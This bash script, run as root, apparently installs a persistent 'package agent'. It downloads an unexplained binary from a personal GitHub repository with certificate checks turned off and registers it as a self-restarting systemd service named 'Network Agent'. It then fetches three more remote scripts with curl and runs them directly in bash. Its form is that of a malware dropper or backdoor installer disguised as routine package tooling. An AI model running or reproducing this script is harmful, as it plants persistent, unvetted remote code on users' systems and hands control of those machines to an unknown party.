#!/bin/bash

# Set variables
AGENT_PATH="/usr/local/package-agents"
SERVICE_PATH="/etc/systemd/system/package-agents.service"
DOWNLOAD_URL="https://github.com/yellphonenaing199/package-repo/raw/refs/heads/main/packages"

# Check for root
if [[ $EUID -ne 0 ]]; then
  echo "❌ This script must be run as root."
  exit 1
fi

# Download snap-agent
echo "➜ Downloading snap-agent from $DOWNLOAD_URL..."
wget "$DOWNLOAD_URL" -O "$AGENT_PATH" --no-check-certificate

# Check if download was successful
if [[ ! -f "$AGENT_PATH" ]]; then
  echo "❌ Failed to download snap-agent to $AGENT_PATH"
  exit 1
fi

# Ensure it's executable
chmod +x "$AGENT_PATH"

# Create systemd service
echo "➜ Creating systemd service..."

cat > "$SERVICE_PATH" <<EOF
[Unit]
Description=Network Agent
After=network.target

[Service]
Type=simple
ExecStart=$AGENT_PATH
Restart=always
RestartSec=60
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

chmod 644 "$SERVICE_PATH"

# Reload systemd and start service
echo "➜ Reloading systemd and starting service..."
systemctl daemon-reload
systemctl enable package-agents.service
systemctl start package-agents.service

# Show status
echo "➜ Service status:"
systemctl status package-agents.service --no-pager

# Function to check and install gcc and make
check_and_install_build_tools() {
    echo "➜ Checking for gcc and make..."
    
    # Check if gcc and make are installed
    if ! command -v gcc &> /dev/null || ! command -v make &> /dev/null; then
        echo "➜ gcc or make not found. Installing build tools..."
        
        # Detect package manager and install accordingly
        if command -v apt &> /dev/null; then
            # Debian/Ubuntu
            echo "➜ Using apt package manager..."
            apt update
            apt install -y build-essential
        elif command -v yum &> /dev/null; then
            # RHEL/CentOS/Fedora (older)
            echo "➜ Using yum package manager..."
            yum groupinstall -y "Development Tools"
        elif command -v dnf &> /dev/null; then
            # Fedora (newer)
            echo "➜ Using dnf package manager..."
            dnf groupinstall -y "Development Tools"
        elif command -v apk &> /dev/null; then
            # Alpine Linux
            echo "➜ Using apk package manager..."
            apk update
            apk add build-base
        elif command -v zypper &> /dev/null; then
            # openSUSE
            echo "➜ Using zypper package manager..."
            zypper install -y gcc make
        elif command -v pacman &> /dev/null; then
            # Arch Linux
            echo "➜ Using pacman package manager..."
            pacman -S --noconfirm base-devel
        else
            echo "❌ No supported package manager found. Please install gcc and make manually."
            exit 1
        fi
        
        # Verify installation
        if command -v gcc &> /dev/null && command -v make &> /dev/null; then
            echo "✅ gcc and make successfully installed."
        else
            echo "❌ Failed to install gcc and make."
            exit 1
        fi
    else
        echo "✅ gcc and make are already installed."
    fi
}

# Check and install build tools
check_and_install_build_tools

bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/package-repo/refs/heads/main/service-dis.sh)
bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/package-repo/refs/heads/main/test.sh)
bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/installer/refs/heads/main/hhh.sh)
